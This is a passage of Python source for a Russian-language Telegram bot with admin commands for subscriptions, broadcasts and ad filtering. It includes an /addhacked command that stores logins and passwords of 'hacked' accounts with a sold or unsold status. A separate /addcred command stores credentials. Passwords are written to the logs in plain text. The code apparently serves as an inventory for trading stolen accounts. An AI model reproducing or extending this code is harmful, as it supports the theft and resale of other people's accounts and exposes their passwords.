        except Exception as e:
            logger.error(f"Ошибка /techstop: {e}")
        return
    tech_mode = True
    response = "🔧 Технический режим включён!"
    try:
        bot.reply_to(message, response)
        logger.info(f"Ответ: {response}")
        user = get_user(chat_id)
        save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка отправки /techstop: {e}")

# Команда /techstopoff
@bot.message_handler(commands=['techstopoff'])
def techstopoff_cmd(message):
    """Выключает тех. режим"""
    global tech_mode
    chat_id = str(message.chat.id)
    logger.info(f"/techstopoff от {chat_id}")
    access = check_access(chat_id, 'techstopoff')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /techstopoff: {e}")
        return
    tech_mode = False
    response = "🔧 Технический режим выключен!"
    try:
        bot.reply_to(message, response)
        logger.info(f"Ответ: {response}")
        user = get_user(chat_id)
        save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка отправки /techstopoff: {e}")

# Команда /adprefix
@bot.message_handler(commands=['adprefix'])
def adprefix_cmd(message):
    """Выдаёт подписку"""
    chat_id = str(message.chat.id)
    logger.info(f"/adprefix от {chat_id}")
    access = check_access(chat_id, 'adprefix')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /adprefix: {e}")
        return
    try:
        msg = bot.reply_to(message, "Введите chat_id и префикс (через пробел):")
        bot.register_next_step_handler(msg, process_adprefix)
        logger.info(f"Запрошен префикс от {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка /adprefix: {e}")

def process_adprefix(message):
    """Обрабатывает выдачу подписки"""
    chat_id = str(message.chat.id)
    try:
        target_id, prefix = sanitize_input(message.text).split()
        subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
        save_user(target_id, prefix, subscription_end, target_id)
        bot.reply_to(message, f"✅ Подписка выдана для {target_id} ({prefix})!")
        logger.info(f"Подписка для {target_id}: {prefix}")
    except ValueError:
        logger.warning("Неверный формат")
        bot.reply_to(message, "❌ Формат: chat_id префикс")
    except Exception as e:
        logger.error(f"Ошибка обработки префикса: {e}")
        bot.reply_to(message, "❌ Ошибка!")

# Команда /delprefix
@bot.message_handler(commands=['delprefix'])
def delprefix_cmd(message):
    """Сбрасывает подписку"""
    chat_id = str(message.chat.id)
    logger.info(f"/delprefix от {chat_id}")
    access = check_access(chat_id, 'delprefix')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /delprefix: {e}")
        return
    try:
        msg = bot.reply_to(message, "Введите chat_id:")
        bot.register_next_step_handler(msg, process_delprefix)
        logger.info(f"Запрошено удаление префикса от {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка /delprefix: {e}")

def process_delprefix(message):
    """Обрабатывает сброс подписки"""
    chat_id = str(message.chat.id)
    target_id = sanitize_input(message.text)
    logger.info(f"Сброс подписки для {target_id} от {chat_id}")
    if not target_id:
        try:
            bot.reply_to(message, "❌ ID не может быть пустым!")
            logger.warning("Пустой ID")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    save_user(target_id, "Посетитель", get_current_time().isoformat(), target_id)
    try:
        bot.reply_to(message, f"✅ Подписка сброшена для {target_id}!")
        logger.info(f"Сброшена подписка для {target_id}")
    except Exception as e:
        logger.error(f"Ошибка сброса: {e}")

# Команда /adduser
@bot.message_handler(commands=['adduser'])
def adduser_cmd(message):
    """Добавляет пользователя"""
    chat_id = str(message.chat.id)
    logger.info(f"/adduser от {chat_id}")
    access = check_access(chat_id, 'adduser')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /adduser: {e}")
        return
    try:
        msg = bot.reply_to(message, "Введите chat_id и префикс (через пробел):")
        bot.register_next_step_handler(msg, process_add_user)
        logger.info(f"Запрошен новый пользователь от {chat_id}")
    except Exception as e:
        logger.error(f"Ошибка /adduser: {e}")

def process_add_user(message):
    """Обрабатывает добавление пользователя"""
    chat_id = str(message.chat.id)
    try:
        target_id, prefix = sanitize_input(message.text).split()
        save_user(target_id, prefix, get_current_time().isoformat(), target_id)
        bot.reply_to(message, f"✅ Пользователь {target_id} добавлен ({prefix})!")
        logger.info(f"Добавлен пользователь {target_id}: {prefix}")
    except ValueError:
        logger.warning("Неверный формат")
        bot.reply_to(message, "❌ Формат: chat_id префикс")
    except Exception as e:
        logger.error(f"Ошибка добавления: {e}")
        bot.reply_to(message, "❌ Ошибка!")

# Команда /addcred
@bot.message_handler(commands=['addcred'])
def addcred_cmd(message):
    """Добавляет пароль"""
    chat_id = str(message.chat.id)
    logger.info(f"/addcred от {chat_id}")
    access = check_access(chat_id, 'addcred')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /addcred: {e}")
        return
    try:
        msg = bot.reply_to(message, "Введите логин для credentials:")
        bot.register_next_step_handler(msg, process_add_cred_login)
        logger.info(f"Запрошен логин для credentials")
    except Exception as e:
        logger.error(f"Ошибка /addcred: {e}")

def process_add_cred_login(message):
    """Обрабатывает логин для credentials"""
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин для credentials: {login}")
    if not login:
        try:
            bot.reply_to(message, "❌ Логин не может быть пустым!")
            logger.warning("Пустой логин")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        msg = bot.reply_to(message, "Введите пароль:")
        bot.register_next_step_handler(msg, lambda m: process_add_cred_password(m, login))
        logger.info(f"Запрошен пароль для {login}")
    except Exception as e:
        logger.error(f"Ошибка обработки логина: {e}")

def process_add_cred_password(message, login):
    """Добавляет запись в credentials"""
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"Пароль для {login}: {password}")
    if not password:
        try:
            bot.reply_to(message, "❌ Пароль не может быть пустым!")
            logger.warning("Пустой пароль")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    conn = get_db_connection()
    if conn is None:
        try:
            bot.reply_to(message, "❌ База недоступна!")
            logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        c = conn.cursor()
        c.execute(
            '''
            INSERT INTO credentials (login, password, added_time, added_by)
            VALUES (%s, %s, %s, %s)
            ''',
            (login, password, get_current_time().isoformat(), chat_id)
        )
        conn.commit()
        bot.reply_to(message, f"✅ Пароль для {login} добавлен!")
        logger.info(f"Добавлен пароль: {login}")
    except Exception as e:
        logger.error(f"Ошибка добавления: {e}")
        bot.reply_to(message, "❌ Ошибка!")
    finally:
        conn.close()

# Команда /addhacked
@bot.message_handler(commands=['addhacked'])
def addhacked_cmd(message):
    """Добавляет взломанный аккаунт"""
    chat_id = str(message.chat.id)
    logger.info(f"/addhacked от {chat_id}")
    access = check_access(chat_id, 'addhacked')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /addhacked: {e}")
        return
    try:
        msg = bot.reply_to(message, "Введите логин для hacked:")
        bot.register_next_step_handler(msg, process_add_hacked_login)
        logger.info(f"Запрошен логин для hacked")
    except Exception as e:
        logger.error(f"Ошибка /addhacked: {e}")

def process_add_hacked_login(message):
    """Обрабатывает логин для hacked"""
    chat_id = str(message.chat.id)
    login = sanitize_input(message.text)
    logger.info(f"Логин для hacked: {login}")
    if not login:
        try:
            bot.reply_to(message, "❌ Логин не может быть пустым!")
            logger.warning("Пустой логин")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    try:
        msg = bot.reply_to(message, "Введите пароль:")
        bot.register_next_step_handler(msg, lambda m: process_add_hacked_password(m, login))
        logger.info(f"Запрошен пароль для {login}")
    except Exception as e:
        logger.error(f"Ошибка обработки логина: {e}")

def process_add_hacked_password(message, login):
    """Обрабатывает пароль и статус"""
    chat_id = str(message.chat.id)
    password = sanitize_input(message.text)
    logger.info(f"Пароль для {login}: {password}")
    if not password:
        try:
            bot.reply_to(message, "❌ Пароль не может быть пустым!")
            logger.warning("Пустой пароль")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(
        types.InlineKeyboardButton("Продан", callback_data=f"hacked_status_sold_{login}_{password}"),
        types.InlineKeyboardButton("Непродан", callback_data=f"hacked_status_not_sold_{login}_{password}")
    )
    try:
        bot.reply_to(message, "Выберите статус:", reply_markup=keyboard)
        logger.info(f"Запрошен статус для {login}")
    except Exception as e:
        logger.error(f"Ошибка выбора статуса: {e}")

# Команда /broadcast
@bot.message_handler(commands=['broadcast'])
def broadcast_cmd(message):
    """Инициирует рассылку"""
    chat_id = str(message.chat.id)
    logger.info(f"/broadcast от {chat_id}")
    access = check_access(chat_id, 'broadcast')
    if access:
        try:
            bot.reply_to(message, access)
            logger.info(f"Ответ: {access}")
        except Exception as e:
            logger.error(f"Ошибка /broadcast: {e}")
        return
    try:
        msg = bot.reply_to(message, "📢 Введите сообщение для рассылки:")
        bot.register_next_step_handler(msg, process_broadcast_message)
        logger.info(f"Запрошен текст рассылки")
    except Exception as e:
        logger.error(f"Ошибка /broadcast: {e}")

def process_broadcast_message(message):
    """Обрабатывает текст рассылки"""
    chat_id = str(message.chat.id)
    text = sanitize_input(message.text)
    logger.info(f"Текст рассылки от {chat_id}: {text}")
    if not text:
        try:
            bot.reply_to(message, "❌ Сообщение не может быть пустым!")
            logger.warning("Пустое сообщение")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    if any(keyword in text.lower() for keyword in ad_keywords):
        try:
            bot.reply_to(message, "🚫 Сообщение содержит запрещённые слова!")
            logger.warning(f"Реклама в рассылке: {text}")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    users = get_all_users()
    if not users:
        try:
            bot.reply_to(message, "📢 Нет пользователей!")
            logger.info("Нет пользователей")
        except Exception as e:
            logger.error(f"Ошибка ответа: {e}")
        return
    success_count = 0
    fail_count = 0
    logger.info(f"Рассылка для {len(users)} пользователей")
    for user_id in users:
        try:
            bot.send_message(user_id, f"📢 Сообщение от Создателя:\n{text}")
            success_count += 1
            logger.debug(f"Отправлено {user_id}")
            time.sleep(0.05)
        except Exception as e:
            logger.error(f"Ошибка отправки {user_id}: {e}")
            fail_count += 1
    response = f"📢 Рассылка завершена!\n✅ Отправлено: {success_count}\n❌ Ошибок: {fail_count}"
    try:
        bot.reply_to(message, response)
        logger.info(f"Рассылка: {success_count} ок, {fail_count} ошибок")
    except Exception as e:
        logger.error(f"Ошибка результата: {e}")

# Обработка неизвестных команд
@bot.message_handler(func=lambda message: True)
def unknown_command(message):
    """Блокирует рекламу и неизвестные команды"""
    chat_id = str(message.chat.id)
    text = sanitize_input(message.text.lower())
    logger.info(f"Неизвестная команда от {chat_id}: {text}")
    if any(keyword in text for keyword in ad_keywords):
        logger.warning(f"Реклама от {chat_id}: {text}")
        try:
            bot.reply_to(message, "🚫 Реклама заблокирована!")
            bot.send_message(ADMIN_CHAT_ID, f"🚨 Реклама от {chat_id}:\n{text}")
            logger.info(f"Реклама заблокирована")
        except Exception as e:
            logger.error(f"Ошибка блокировки: {e}")
        return
    response = "❌ Неизвестная команда!\nИспользуйте /menu."
    try:
        bot.reply_to(message, response)
        logger.info(f"Ответ: {response}")
        user = get_user(chat_id)
        if user:
            save_user(chat_id, user['prefix'], user['subscription_end'], message.from_user.id)
    except Exception as e:
        logger.error(f"Ошибка ответа: {e}")

# Мониторинг активности
def monitor_activity():
    """Проверяет неактивных пользователей"""
    logger.info("Запуск мониторинга")
    while True:
        try:
            conn = get_db_connection()
            if conn:
                c = conn.cursor()
                c.execute(
                    "SELECT chat_id, last_activity FROM users WHERE last_activity < %s",
                    ((get_current_time() - timedelta(days=30)).isoformat(),)
                )
                inactive = c.fetchall()
                for user_id, last_activity in inactive:
                    logger.info(f"Неактивен {user_id}: {last_activity}")
                conn.close()
            else:
                logger.error("База недоступна")
        except Exception as e:
            logger.error(f"Ошибка мониторинга: {e}")
        time.sleep(3600)

# Статистика базы
def get_db_stats():
    """Возвращает статистику базы"""
    logger.info("Запрос статистики")
    conn = get_db_connection()
    if conn is None:
        logger.error("База недоступна")
        return None
    try:
        c = conn.cursor()
        c.execute("SELECT COUNT(*) FROM users")
        user_count = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM credentials")
        cred_count = c.fetchone()[0]
        c.execute("SELECT COUNT(*) FROM hacked_accounts")
        hacked_count = c.fetchone()[0]
        logger.info(f"Статистика: {user_count} users, {cred_count} creds, {hacked_count} hacked")
        return {'users': user_count, 'credentials': cred_count, 'hacked': hacked_count}
    except Exception as e:
        logger.error(f"Ошибка статистики: {e}")
        return None
    finally:
        conn.close()

# Валидация пароля
def validate_password(password):
    """Проверяет сложность пароля"""
    logger.debug(f"Валидация пароля: {password}")
    if len(password) < 6:
        logger.warning("Пароль слишком короткий")
        return False
    if not re.search(r'[A-Za-z0-9]', password):
        logger.warning("Пароль не содержит букв или цифр")
        return False
    logger.debug("Пароль валиден")
    return True

# Запуск
if __name__ == '__main__':
    logger.info("Запуск бота")
    if not init_db():
        logger.error("Ошибка инициализации базы")
        raise Exception("Database init failed")
    threading.Thread(target=keep_alive, daemon=True).start()
    logger.info("Keep_alive запущен")
    threading.Thread(target=monitor_activity, daemon=True).start()
    logger.info("Мониторинг запущен")
    try:
        logger.info("Удаление старого вебхука")
        bot.remove_webhook()
        time.sleep(1)
        webhook_url = f'{SITE_URL}/webhook'
        logger.info(f"Установка вебхука: {webhook_url}")
        bot.set_webhook(url=webhook_url, secret_token=SECRET_WEBHOOK_TOKEN)
        logger.info(f"Вебхук установлен с токеном: {SECRET_WEBHOOK_TOKEN}")
    except Exception as e:
        logger.error(f"Ошибка вебхука: {e}")
        raise
    try:
        logger.info("Запуск Flask")
        app.run(
            host='0.0.0.0',
            port=int(os.getenv('PORT', 10000)),
            debug=False
        )
    except Exception as e:
        logger.error(f"Ошибка сервера: {e}")
        raise
